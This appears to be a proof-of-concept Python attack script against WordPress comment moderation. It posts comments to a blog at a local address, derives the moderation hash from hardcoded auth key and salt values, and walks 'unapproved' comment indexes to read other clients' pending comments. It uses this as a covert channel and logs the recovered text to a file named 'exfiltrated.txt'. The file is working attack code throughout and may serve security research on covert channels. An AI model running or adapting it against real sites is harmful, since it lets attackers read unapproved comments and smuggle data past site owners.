#!/usr/bin/env python3

from wpc2 import *
from bs4 import BeautifulSoup
import urllib.parse
import sys
import datetime

random.seed(int(datetime.datetime.now().timestamp()) + int(sys.argv[1]))

AUTH_KEY = "0c008b2f27fbaf5e9acaaa08bf251fc98c6d38a1"
AUTH_SALT = "ea30c9849bfd208c9890cbf7bb56f59a20b52c4f"
target_blog = "http://127.0.0.3/"
sync_channel = "2021/08/06/hello-world/"

server_time_slot = "2:22"
client_time_slot = "1:11"

comment_index = 0
prev_unapproved_index = 0

class Client:
    id = ""
    time_slot = ""

def fetch_comments_page(comments_url):
    fetch_comments_command = """
    curl '""" \
    + comments_url + \
    """' \
      -H 'Connection: keep-alive' \
      -H 'Cache-Control: max-age=0' \
      -H 'sec-ch-ua: "Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"' \
      -H 'sec-ch-ua-mobile: ?1' \
      -H 'Upgrade-Insecure-Requests: 1' \
      -H 'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36' \
      -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
      -H 'Sec-Fetch-Site: none' \
      -H 'Sec-Fetch-Mode: navigate' \
      -H 'Sec-Fetch-User: ?1' \
      -H 'Sec-Fetch-Dest: document' \
      -H 'Accept-Language: en-US,en;q=0.9' \
      --compressed -s
    """
    curl_output = subprocess.check_output(fetch_comments_command, shell=True)
    return curl_output.decode()

def get_unapproved_index_from_url(url):
    url_parsed = urllib.parse.urlparse(url)
    queries = urllib.parse.parse_qs(url_parsed.query)

    if 'unapproved' in queries:
        return int(queries['unapproved'][0])
    else:
        return -1

def get_current_unapproved_index():
    global comment_index

    random_string = generate_random_string(10)
    comment_to_send = random_string + ": get_current_unapproved_index (" + str(comment_index) + ") "
    response = submit_comment(comment_to_send)
    comment_index += 1

    response_splitted = response.split("\n")
    response_details = response_splitted[-1]

    response_splitted = response_details.split(",")
    url = response_splitted[1]
    return get_unapproved_index_from_url(url)

def get_moderation_hash_from_url(url):
    url_parsed = urllib.parse.urlparse(url)
    queries = urllib.parse.parse_qs(url_parsed.query)

    if 'moderation-hash' in queries:
        return queries['moderation-hash'][0]
    else:
        return None

def get_moderation_hash_at_current_time():
    random_string = generate_random_string(10)
    response = submit_comment(random_string + ": Getting_moderation_hash")

    response_splitted = response.split("\n")
    response_details = response_splitted[-1]

    response_splitted = response_details.split(",")
    url = response_splitted[1]
    print("## URL is " + url)
    return get_moderation_hash_from_url(url), get_unapproved_index_from_url(url)

clients = []
for i in range(1, 4):
    client = Client()
    client.id = str(i)
    clients.append(client)
    print("## Created client with id: " + str(client.id))

if prev_unapproved_index == 0:
    prev_unapproved_index = get_current_unapproved_index()

loop_counter = 99
while(loop_counter > 0):
    print("[INFO] Delaying to client timeslot. " + client_time_slot);
    delay_to_timeslot(client_time_slot)
    current_hash, server_index = get_moderation_hash_at_current_time()

    print("[INFO] Current hash is: " + current_hash)
    print("[INFO] Delaying to server timeslot. " + server_time_slot);

    delay_to_timeslot(server_time_slot)

    index_client = 0
    processed_unapproved_indexes = []
            
    while index_client < len(clients):
        print("## checking index_client: " + str(index_client))
        
        for index_offset in range(1, len(clients) + 1 + 1):
            print("## prev_unapproved_index: " + str(prev_unapproved_index) + ", index_offset: " + str(index_offset))
            current_unapproved_index = prev_unapproved_index + index_offset
            print("## " + str(current_unapproved_index) + " in? " + str(processed_unapproved_indexes))
            if current_unapproved_index == server_index:
                index_client += 1
                continue
            if current_unapproved_index in processed_unapproved_indexes:
                continue
            
            url = target_blog + sync_channel + "?unapproved=" + str(current_unapproved_index) + "&moderation-hash=" + current_hash + "&url=" + str(current_unapproved_index)
            print("[INFO] Checking URL: " + url);

            response_html = fetch_comments_page(url)
            soup = BeautifulSoup(response_html, "html.parser")

            if soup.find("p", class_="comment-awaiting-moderation"):
                elems = soup.find_all("div", class_="comment-content")
                elem = elems[-1]
                if elem and elem.string:
                    to_write = str(datetime.datetime.utcnow()) + ": "
                    to_write += "Extracted data with timeslot of " + client_time_slot + ": " + str(elem.string).strip() + "\n"
                    print("[INFO] " + to_write);
                    f = open("exfiltrated.txt", "a")
                    f.write(to_write)
                    f.close()

                    processed_unapproved_indexes.append(current_unapproved_index)
                    print("## processed_unapproved_indexes: " + str(processed_unapproved_indexes))
                    break
            else:
                print("[INFO] No comment for moderation for " + client_time_slot + " using index " + str(current_unapproved_index) + ". Skipping...")
        index_client += 1

    prev_unapproved_index = get_current_unapproved_index()
    loop_counter -= 1
